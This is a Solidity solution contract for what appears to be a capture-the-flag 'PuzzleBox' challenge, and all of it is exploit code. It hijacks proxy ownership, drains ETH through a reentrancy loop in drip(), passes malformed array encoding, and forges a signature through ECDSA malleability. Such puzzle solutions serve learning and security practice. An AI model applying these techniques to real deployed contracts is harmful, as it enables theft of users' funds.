pragma solidity ^0.8.19;

import "./PuzzleBox.sol";

contract PuzzleBoxSolution {

    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?
        
        address proxy = address(puzzle);
        address factory = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
        address impl = address(PuzzleBoxFactory(factory).logic());

        EoaSpoof eoaSpoof = new EoaSpoof(puzzle);
        eoaSpoof.reenterDrip();
                
        uint256[] memory torchees = new uint256[](6);
        torchees[0] = 2; 
        torchees[1] = 4;
        torchees[2] = 6;
        torchees[3] = 7;
        torchees[4] = 8;
        torchees[5] = 9;

        (bool r,) = proxy.call(abi.encodePacked(
            puzzle.torch.selector, 
            uint256(0x01),
            false,
            abi.encode(torchees)
        ));
        require(r);

        puzzle.zip();

        puzzle.creep{ gas: 100_000 }();

        address payable[] memory friends = new address payable[](1);
        uint256[] memory friendsCutBps = new uint256[](3);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        // original: friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
        // original: friendsCutBps[0] = 0.015e4; // == 150
        // original: friendsCutBps[1] = 0.0075e4; // == 75
        friendsCutBps[0] = uint256(uint160(0xC817dD2a5daA8f790677e399170c92AabD044b57));
        friendsCutBps[1] = 150;
        friendsCutBps[2] = 75;
        puzzle.spread(friends, friendsCutBps);

        uint256 SECPK251n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);
        puzzle.open(
            uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8), // same nonce as original
            // using abi.encodePacked because a block with multiple lines of `hex` notation is cursed imo
            abi.encodePacked(
                uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8),
                SECPK251n - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df), // secpk251n - original signature's s value
                uint8(0x1b) // since signature malleability is being exploited, 27 should be provided as recovery id instead of 28 to point to other quadrant
            )
        );
    }
}

contract EoaSpoof {

    PuzzleBox puzzle;

    uint256 reentranceCounter;
    
    constructor(PuzzleBox _puzzle) {
        puzzle = _puzzle;
        address payable proxy = payable(address(_puzzle));

        (bool a, bytes memory b) = proxy.call(hex'8da5cb5b'); // check PuzzleBoxProxy.owner storage slot
        _puzzle.operate(); // become operator / owner
        (bool c, bytes memory d) = proxy.call(hex'8da5cb5b'); // prove PuzzleBoxProxy.owner == PuzzleBox.operator
        
        // now that we are operator/owner we can unlock torch()
        PuzzleBoxProxy(proxy).lock(PuzzleBox.torch.selector, false);
    }

    function reenterDrip() external {
        // call drip and initiate reentrancy
        puzzle.drip{ value: 101 }();
    }

    function destro(address puzl, address solution) external {
        puzzle.leak();
        payable(address(uint160(puzl) + uint160(2))).call{ value: 1 }('');
        // selfdestruct(payable(solution));

        uint256 amt = address(this).balance - 7;
        payable(solution).call{ value: amt }('');
        selfdestruct(payable(puzl));
    }

    // fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
    fallback() external payable {
        ++reentranceCounter;

        // reenter 10 times to raise lastDripId to 10
        if (reentranceCounter < 10) {
            puzzle.drip{ value: 101 }();
        }

        // on last reentry
        if (reentranceCounter == 10) {            
            ++reentranceCounter;
            
            this.destro(msg.sender, tx.origin);
        }
    }
}
